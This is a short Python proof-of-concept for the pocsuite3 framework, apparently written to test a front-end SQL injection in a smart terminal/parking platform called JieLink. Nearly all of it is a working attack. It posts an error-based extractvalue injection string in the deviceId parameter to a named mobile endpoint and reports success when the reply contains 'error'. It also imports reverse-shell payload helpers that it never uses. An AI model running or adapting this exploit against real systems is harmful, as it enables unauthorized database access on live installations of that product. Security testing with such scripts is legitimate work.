# _*_ coding:utf-8 _*_
# @Time : 2023/12/12
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class JieLink_zhineng_sql(POCBase):
    pocDesc = '''智能终端操作平台前台通用SQL注入漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-12'
    name = '智能终端操作平台前台通用SQL注入漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/mobile/Remote/GetParkController'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Accept": "application/json, text/plain, */*",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            'X-Requested-With': 'XMLHttpRequest',
            "Content-Type": "application/x-www-form-urlencoded",
            'Cookie': 'DefaultSystem=Mobile; ASP.NET_SessionId=533gfzuselgriachdgogkug5'
        }
        try:
            data = "deviceId=1'and/**/extractvalue(1,concat(char(126),database()))and'"

            response = requests.post(url, headers=headers, data=data)
            if response.status_code == 200 and 'error' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(JieLink_zhineng_sql)